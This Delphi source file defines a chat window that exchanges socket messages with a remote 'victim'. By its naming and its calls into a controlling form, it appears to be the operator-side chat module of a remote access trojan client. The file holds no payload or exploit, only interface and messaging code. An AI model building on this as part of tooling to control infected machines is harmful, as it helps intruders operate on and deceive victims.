unit VictimChatUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs,
  StdCtrls, ExtCtrls, ComCtrls;

type
  TVictimChat = class(TForm)
    Label1: TLabel;
    Edit1: TEdit;
    Button1: TButton;
    Label2: TLabel;
    MyMemo: TRichEdit;
    procedure Button1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure Edit1KeyPress(Sender: TObject; var Key: Char);
    procedure Label2Click(Sender: TObject);
    procedure FormMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure Label2MouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure MyMemoChange(Sender: TObject);
  private
    { Private declarations }
  public
    procedure ShowIt;
    procedure AddToMyMemo(ce: string);
    { Public declarations }
  end;

var
  VictimChat: TVictimChat;
implementation

uses Unit2;

{$R *.DFM}

procedure TVictimChat.AddToMyMemo(ce:string);
begin
if Form1.UseMySettings then
 with MyMemo.SelAttributes do begin
  if (copy(ce,1,8)='<victim>') then
   begin
    Color:=StringToColor(Form1.ReadINI('Options','VictimChatColor'));
    Size:=StrToInt(Form1.ReadINI('Options','VictimFontSize'));
   end else begin
    Color:=StringToColor(Form1.ReadINI('Options','ClientChatColor'));
    Size:=StrToInt(Form1.ReadINI('Options','ClientFontSize'));
   end;
 end else
 with MyMemo.SelAttributes do begin
  Color:=clYellow;
  Size:=10;
 end;
 MyMemo.Lines.Add(ce);
 with MyMemo.SelAttributes do begin
  Color:=clYellow;
  Size:=10;
 end;
end;

procedure TVictimChat.ShowIt;
begin
 MyMemo.Lines.Clear;
 Edit1.Text:='';
 Show;
end;

procedure TVictimChat.Button1Click(Sender: TObject);
begin
 if Edit1.Text<>'' then
 begin
  Form1.ChatSock.Socket.SendText('MTV<'+Form1.NickName+'> '+Edit1.Text);
{  Memo1.Lines.Add('<'+Form1.NickName+'> '+Edit1.Text);}
  Edit1.Text:='';
 end;
end;

procedure TVictimChat.FormClose(Sender: TObject;
  var Action: TCloseAction);
begin
 Form1.ChatSock.Socket.SendText('CVC');
 Form1.Status.Caption:='chat closed.';
 Action:=caHide;
 hide;
end;

procedure TVictimChat.Edit1KeyPress(Sender: TObject; var Key: Char);
begin
 if (Key = #13) then
 begin
  Button1Click(sender);
  Key := #0;
{  PostMessage(Handle, WM_NEXTDLGCTL, 0, 0);}   
 end;
end;

procedure TVictimChat.Label2Click(Sender: TObject);
begin
 Form1.ChatSock.Socket.SendText('CVC');
 Form1.Status.Caption:='chat closed.';
 hide;
end;

procedure TVictimChat.FormMouseMove(Sender: TObject; Shift: TShiftState; X,
  Y: Integer);
begin
 Cursor:=crDefault;
end;

procedure TVictimChat.Label2MouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
 Cursor:=crHandPoint;
end;

procedure TVictimChat.MyMemoChange(Sender: TObject);
begin
 SendMessage(MyMemo.handle, EM_SCROLLCARET,0,0);
end;

end.

